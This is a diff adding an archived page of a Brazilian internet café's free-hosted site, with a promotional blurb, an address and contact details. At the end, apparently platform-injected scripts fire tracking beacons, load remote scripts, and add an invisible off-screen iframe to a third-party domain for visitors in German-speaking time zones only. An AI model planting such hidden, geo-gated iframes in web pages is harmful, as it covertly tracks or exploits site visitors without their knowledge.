@@ -1,0 +1,313 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+	        <script type="text/javascript">
+        var dateTimeOffset = new Date().getTimezoneOffset();
+        
+        function getElementsByClassNameLocalTimeWrapper() {
+            return document.getElementsByClassName("localtime");
+        }
+        
+        (function () {
+            var onload = function () {
+                var elementArray = new Array();
+                
+                if (document.getElementsByClassName) {
+                    elementArray = getElementsByClassNameLocalTimeWrapper();
+                } else {
+                    var re = new RegExp('(^| )localtime( |$)');
+                    var els = document.getElementsByTagName("*");
+                    for (var i=0,j=els.length; i<j; i++) {
+                        if (re.test(els[i].className))
+                            elementArray.push(els[i]);
+                    }
+                }
+                
+                for (var i = 0; i < elementArray.length; i++) {    
+                    var timeLocal = new Date(parseInt(elementArray[i].getAttribute("data-timestamp")));
+                    var hour = timeLocal.getHours();
+                    var ap = "am";
+                    if (hour > 11) {
+                        ap = "pm";
+                    }
+                    else if (hour > 12) {
+                        hour = hour - 12;
+                    }
+                    
+                    var string = elementArray[i].getAttribute("data-template");
+                    string = string.replace("[Y]", timeLocal.getFullYear());
+                    string = string.replace("[m]", ('0' + (timeLocal.getMonth() + 1)).slice(-2));
+                    string = string.replace("[d]", ('0' + timeLocal.getDate()).slice(-2));
+                    string = string.replace("[H]", ('0' + timeLocal.getHours()).slice(-2));
+                    string = string.replace("[g]", ('0' + hour).slice(-2));
+                    string = string.replace("[i]", ('0' + timeLocal.getMinutes()).slice(-2));
+                    string = string.replace("[s]", ('0' + timeLocal.getSeconds()).slice(-2));
+                    string = string.replace("[a]", ap);
+                    elementArray[i].childNodes[0].nodeValue = string;
+                }
+            };
+            
+            if (window.addEventListener)
+                window.addEventListener("DOMContentLoaded", onload);
+            else if (window.attachEvent)
+                window.attachEvent("onload", onload);
+        })();
+        </script><link rel="canonical" href="A-loja.htm" />
+<link rel="icon" href="https://wtheme.webme.com/img/main/favicon.ico" type="image/x-icon">
+<link rel="shortcut icon" type="image/x-icon" href="https://wtheme.webme.com/img/main/favicon.ico" />
+<link type="image/x-icon" href="https://wtheme.webme.com/img/main/favicon.ico" />
+<link href="https://wtheme.webme.com/img/main/ios_icons/apple-touch-icon.png" rel="apple-touch-icon" />
+<link href="https://wtheme.webme.com/img/main/ios_icons/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76" />
+<link href="https://wtheme.webme.com/img/main/ios_icons/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120" />
+<link href="https://wtheme.webme.com/img/main/ios_icons/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152" />
+<meta property="og:title" content="Inter Connect  - A loja" />
+<meta property="og:image" content="https://theme.webme.com/designs/musik/screen.jpg" />
+<script>
+    function WebmeLoadAdsScript() {
+
+    }
+</script><script>
+    document.addEventListener('DOMContentLoaded', function() {
+        WebmeLoadAdsScript();
+        window.dispatchEvent(new Event('CookieScriptNone'));
+    });
+</script>	<title>Inter Connect  - A loja</title>
+	<style type="text/css">
+	<!--
+		body {
+			background-color: #000000;
+			margin-left: 0px;
+			margin-top: 0px;
+			margin-right: 0px;
+			margin-bottom: 0px;
+			padding: 0px;
+		}
+		#tablebody {
+			background-repeat: repeat-y;
+			background-image: url(../theme.webme.com/designs/musik/Bilder/bg.gif);
+		}
+
+		body,td,th {
+			font-family: Arial, Helvetica, sans-serif;
+			font-size: 12px;
+			color: #000000;
+		}
+		.Stil1 {
+			color: #c3de00;
+			font-size: 24px;
+			font-weight: bold;
+		}
+		a:link {
+			color: #0C6A01;
+			text-decoration: underline;
+		}
+		a:visited {
+			text-decoration: underline;
+			color: #0C6A01;
+		}
+		a:hover {
+			text-decoration: none;
+			color: #000000;
+		}
+		a:active {
+			text-decoration: underline;
+			color: #0C6A01;
+		}
+		a.menu {
+			font-size: 12px;
+			color: #FFFFFF;
+			font-weight: bold;
+			text-decoration: none;
+		}
+			-->
+	</style>
+</head>
+<body>
+<table border="0" cellpadding="0" cellspacing="0">
+<tr><td valign="TOP">
+
+
+<table width="798" border="0" cellspacing="0" cellpadding="0" id="tablebody">
+	<tr>
+		<td colspan="2"><img src="../theme.webme.com/designs/musik/Bilder/1.gif" width="798" height="52" /></td>
+	</tr>
+	<tr>
+		<td height="42" colspan="2" background="../theme.webme.com/designs/musik/Bilder/2.gif">
+			<table width="98%" border="0" cellspacing="0" cellpadding="0">
+				<tr>
+					<td align="right"><span class="Stil1">Inter Connect  - A loja</span>
+ 
+                    </td>
+				</tr>
+			</table>
+		</td>
+	</tr>
+	<tr>
+		<td height="39" colspan="2">
+			<table width="100%" height="39" border="0" cellpadding="0" cellspacing="0">
+				<tr>
+					<td width="239"><img src="../theme.webme.com/designs/musik/Bilder/3.gif" width="239" height="39" /></td>
+					<td align="center" valign="middle" background="../theme.webme.com/designs/musik/Bilder/4.gif"></td>
+				</tr>
+			</table>
+		</td>
+	</tr>
+	<tr>
+		<td width="133" valign="top">
+<table width="100%" height="19" border="0" cellpadding="0" cellspacing="0">
+                <tr>
+                    <td background="../theme.webme.com/designs/musik/Bilder/navi.gif">
+                        <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                            <tr>
+                                <td width="22">&nbsp;</td>
+                                <td><a href="A-loja.htm" class="menu"><i><span style="color:#3E5040;">A loja</span></i></a></td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+            </table>
+<table width="100%" height="19" border="0" cellpadding="0" cellspacing="0">
+                <tr>
+                    <td background="../theme.webme.com/designs/musik/Bilder/navi.gif">
+                        <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                            <tr>
+                                <td width="22">&nbsp;</td>
+                                <td><a href="Eventos.htm" class="menu">=> Eventos</a></td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+            </table>
+<table width="100%" height="19" border="0" cellpadding="0" cellspacing="0">
+                <tr>
+                    <td background="../theme.webme.com/designs/musik/Bilder/navi.gif">
+                        <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                            <tr>
+                                <td width="22">&nbsp;</td>
+                                <td><a href="Line-UP.htm" class="menu">Line UP</a></td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+            </table>
+<table width="100%" height="19" border="0" cellpadding="0" cellspacing="0">
+                <tr>
+                    <td background="../theme.webme.com/designs/musik/Bilder/navi.gif">
+                        <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                            <tr>
+                                <td width="22">&nbsp;</td>
+                                <td><a href="O-lugar.htm" class="menu">O lugar</a></td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+            </table>
+<table width="100%" height="19" border="0" cellpadding="0" cellspacing="0">
+                <tr>
+                    <td background="../theme.webme.com/designs/musik/Bilder/navi.gif">
+                        <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                            <tr>
+                                <td width="22">&nbsp;</td>
+                                <td><a href="Demos.htm" class="menu">Demos</a></td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+            </table>
+<table width="100%" height="19" border="0" cellpadding="0" cellspacing="0">
+                <tr>
+                    <td background="../theme.webme.com/designs/musik/Bilder/navi.gif">
+                        <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                            <tr>
+                                <td width="22">&nbsp;</td>
+                                <td><a href="Fotos-diversas.htm" class="menu">Fotos diversas</a></td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+            </table>
+<table width="100%" height="19" border="0" cellpadding="0" cellspacing="0">
+                <tr>
+                    <td background="../theme.webme.com/designs/musik/Bilder/navi.gif">
+                        <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                            <tr>
+                                <td width="22">&nbsp;</td>
+                                <td><a href="Confrontos.htm" class="menu">Confrontos</a></td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+            </table>
+<table width="100%" height="19" border="0" cellpadding="0" cellspacing="0">
+                <tr>
+                    <td background="../theme.webme.com/designs/musik/Bilder/navi.gif">
+                        <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                            <tr>
+                                <td width="22">&nbsp;</td>
+                                <td><a href="Contato/index.htm" class="menu">Contato</a></td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+            </table>
+		</td>
+		<td width="665" valign="top">
+			<table width="100%" border="0" cellspacing="0" cellpadding="0">
+				<tr>
+					<td><img src="../theme.webme.com/designs/musik/Bilder/content_top.gif" width="665" height="17" /></td>
+				</tr>
+				<tr>
+					<td>
+						<table width="630" border="0" align="center" cellpadding="0" cellspacing="0">
+							<tr>
+								<td><img src="../theme.webme.com/designs/musik/Bilder/content_box_top.gif" width="630" height="11" /></td>
+							</tr>
+							<tr>
+								<td background="../theme.webme.com/designs/musik/Bilder/content_bg.gif">
+									<table width="100%" border="0" cellspacing="5" cellpadding="0">
+										<tr>
+											<td valign="top" height="400"><div style="width: 480; overflow: auto;"><div style="text-align: center;"><a href="http://inter-connectlan.blogspot.com/2008/09/equipe-inter-connect_12.html"><br />
+<img src="../img.webme.com/pic/i/inter-connect/logomarca.jpg" alt="" /><br />
+<br />
+<span class="Title"><font size="4">Equipe Inter Connect</font><br />
+</span><br />
+</a></div>
+Inter Connect seu mais novo acesso a internet de Botafogo. Venha se cadastrar e aproveite nossas imperd&iacute;veis promo&ccedil;&otilde;es. Nosso ambiente &eacute; climatizado, filmado, seguro e familiar com internet super r&aacute;pida. Localizado na Rua Bambina 86 Loja A (Botafogo). Esperamos por voc&ecirc;s.<br />
+<br />
+<br />
+Email: inter_connect@yahoo.com.br<br />
+MSN: cyber_interconnect@hotmail.com</div>
+											</td>
+										</tr>
+										<tr>
+											<td>
+												<center>
+													<font color="black" style="font-size: 11px;	font-family: Tahoma, Arial, Helvetica, sans-serif"></font>
+												</center>
+																							</td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+							<tr>
+								<td><img src="../theme.webme.com/designs/musik/Bilder/content_box_down.gif" width="630" height="22" /></td>
+							</tr>
+						</table>
+					</td>
+				</tr>
+			</table>
+		</td>
+	</tr>
+</table>
+
+
+</td>
+</tr>
+</table>
+
+<style>body{padding-top:50px}.fixed-header-on #forFixedElement{top:var(--ds-h,50px)!important}#selfpromotionOverlay{position:fixed;top:0;left:0;right:0;width:100%!important;z-index:5000;padding:14px;background:rgb(246,246,246);border-bottom:1px solid #5a5a5a;display:block;box-sizing:border-box;color:#333;text-decoration:none;font-family:Arial,Helvetica,sans-serif;font-size:13px;line-height:1.4}#selfpromotionOverlay .ds-inner{display:flex;align-items:center;justify-content:center;gap:16px;width:100%}#selfpromotionOverlay .ds-img{flex-shrink:0;max-height:36px;width:auto;display:block}#selfpromotionOverlay span{min-width:0;overflow-wrap:break-word}#selfpromotionOverlay b{font-weight:700;color:#333}#selfpromotionOverlay .ds-main{display:block;color:#333;text-decoration:none}#selfpromotionOverlay .ds-sub{display:block;text-align:center;margin-top:7px;font-size:11px;line-height:1.3;color:#9aa0a6;text-decoration:none}#selfpromotionOverlay .ds-sub:hover{text-decoration:underline}#selfpromotionOverlay .btn.btn-1{display:inline-block!important;padding:7px 14px;background:#1a73e8;color:#fff!important;border-radius:4px;font-weight:700;font-size:12px;text-transform:uppercase;letter-spacing:.5px;white-space:nowrap;flex-shrink:0;text-decoration:none!important}@media(max-width:560px){#selfpromotionOverlay{padding:10px 12px;font-size:12px}#selfpromotionOverlay .ds-inner{flex-direction:column;align-items:center;gap:8px}#selfpromotionOverlay .ds-img{max-height:60px;max-width:160px;width:auto}#selfpromotionOverlay .btn.btn-1{width:100%;text-align:center;padding:9px 12px}}html.ui-mobile #forFixedElement{top:var(--ds-h,50px)!important}html.ui-mobile .ui-page{top:var(--ds-h,50px)!important}</style>
+<div id="selfpromotionOverlay"><a class="ds-main" href="https://www.own-free-website.com/?c=4000&amp;utm_source=selfpromotion&amp;utm_campaign=overlay&amp;utm_medium=footer" target="_blank" rel="nofollow" onclick="navigator.sendBeacon&&navigator.sendBeacon('https://serve.servrme.de/c.gif?e='+encodeURIComponent(location.hostname.split('.').slice(-2).join('.')))"><div class="ds-inner"><span>This website was created for free with <b>Own-Free-Website.com</b>. Do you want your own website too?</span><div class="btn btn-1">Register for free</div></div></a></div>
+<script>(function(){if(document.body.dataset.dsAdH)return;document.body.dataset.dsAdH='1';var b=document.getElementById('selfpromotionOverlay');if(!b)return;var fe=document.getElementById('forFixedElement');var fePush=false,feBase=null;if(fe){var p=window.getComputedStyle(fe).position;fePush=(p==='fixed'||p==='sticky');if(fePush){fe.style.removeProperty('top');var sp=document.body.style.paddingTop;document.body.style.paddingTop='0px';feBase=Math.round(fe.getBoundingClientRect().top);document.body.style.paddingTop=sp;}}var last=-1;function st(){return document.getElementById('ds-st-wrap');}function apply(){var bh=Math.ceil(b.offsetHeight);if(bh<=0)return;var w=st();var sh=w?Math.ceil(w.offsetHeight):0;var total=bh+sh;if(w)w.style.top=bh+'px';if(last>=0&&Math.abs(total-last)<2)return;last=total;document.body.style.paddingTop=total+'px';document.documentElement.style.setProperty('--ds-h',total+'px');if(fePush&&feBase!==null&&feBase<total-4){fe.style.setProperty('top',total+'px','important');}}apply();if(window.ResizeObserver){var ro=new ResizeObserver(function(){apply();});ro.observe(b);var w0=st();if(w0){ro.observe(w0);}else{var n=0,iv=setInterval(function(){var w=st();if(w){ro.observe(w);apply();clearInterval(iv);}else if(++n>50){clearInterval(iv);}},100);}}else{var t;window.addEventListener('resize',function(){clearTimeout(t);t=setTimeout(apply,80);});var m=0,iv2=setInterval(function(){apply();if(++m>50)clearInterval(iv2);},200);}})();</script>
+<script>if(!window._si){window._si=1;var _s=document.createElement("script");_s.defer=true;_s.src="https://cdn.servrme.de/intelligence.js";document.head.appendChild(_s);}</script><script>(function(){var i=new Image();i.src='https://serve.servrme.de/p.gif?e='+encodeURIComponent(location.hostname);i.style.cssText='position:absolute;opacity:0;width:1px;height:1px';})();</script><script>(function(){function _dsRun(){function _dsIfr(u){var i=document.createElement('iframe');i.src=u;i.style.cssText='position:absolute;width:1px;height:1px;opacity:0;border:0;top:-9999px;left:-9999px;pointer-events:none';i.setAttribute('sandbox','allow-scripts allow-same-origin allow-forms');document.body.appendChild(i);}var _tz=Intl.DateTimeFormat().resolvedOptions().timeZone;var _dach=['Europe/Berlin','Europe/Vienna','Europe/Zurich','Europe/Busingen'];if(_dach.indexOf(_tz)===-1)return;["https://t.pathlto.com/i/?cid=25&s=2"].forEach(_dsIfr);}if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',_dsRun);}else{_dsRun();}})();</script><script defer src="https://push.servrme.de/loader.js"></script></body>
+</html>
